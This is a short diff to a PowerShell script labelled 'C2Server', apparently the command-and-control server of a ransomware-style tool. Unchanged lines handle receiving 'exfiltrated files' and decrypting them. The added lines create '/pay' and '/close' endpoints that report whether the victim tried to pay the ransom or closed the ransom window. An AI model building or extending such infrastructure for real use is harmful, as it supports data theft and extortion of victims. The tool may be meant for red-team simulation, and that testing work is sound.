@@ -1,4 +1,5 @@
 ﻿#================================#
+#================================#
 #     C2Server by @JoelGMSec     #
 #      https://darkbyte.net      #
 #================================#
@@ -137,6 +138,12 @@ if ($context.Request.HttpMethod -eq "GET") {
    
    if ($context.Request.RawUrl -eq"/files") { mkdir "C2Files" 2>&1> $null 
       Write-Host ; Write-Host "[i] Recieving exfiltrated files and decrypting.." -f Green ; sleep 2 }   
+
+   if ($context.Request.RawUrl -eq "/pay") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; sleep 2
+      Write-Host "[!] User was tried to pay the rescue!" -f Red }
+
+   if ($context.Request.RawUrl -eq "/close") { Write-Host ; Write-Host "[i] Waiting response for payment.." -f Green ; sleep 2
+      Write-Host "[!] User was closed the rescue window!" -f Red }
 
    if ($context.Request.RawUrl -eq "/done") { Write-Host ; Write-Host "[i] Done!" -f Green ; Write-Host ; $http.Stop() }
    
